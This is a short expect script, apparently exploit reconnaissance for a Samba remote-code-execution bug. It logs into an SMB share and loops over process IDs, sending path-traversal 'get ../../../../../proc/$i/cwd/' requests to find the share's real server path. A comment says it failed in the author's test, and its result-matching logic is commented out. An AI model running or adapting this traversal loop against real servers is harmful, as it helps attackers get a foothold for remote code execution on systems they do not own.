#!/usr/bin/expect -f
# locate the share true  dirtory in samba rce
# from twiiter @taviso but i test it failed 
# https://twitter.com/taviso/status/867554062291484672


spawn /usr/bin/smbclient //x.x.x.x/share -U smbtest%password

set timeout 3
for {set i 1} {$i<=65535} {incr i} {
	
	
	expect "smb:"		
	send "get ../../../../../proc/$i/cwd/test.txt /root/test$i.txt\r"

	#puts $p
	log_file /root/log_file


	# "NT_STATUS_OBJECT_NAME_NOT_FOUND*"	{puts "no"}
	# "getting *"			{puts "Find it : /proc/$i/cwd/" exit}	
	# "Error opening "	{puts "Find it : /proc/$i/cwd/" exit}
	#send "!if [  \-f "/root/Desktop/mass.html" ];then echo yes;fi"

	#expect "getting file*"
	#puts "Find it : /proc/$i/cwd/"
	#exit
}

expect eof


exit
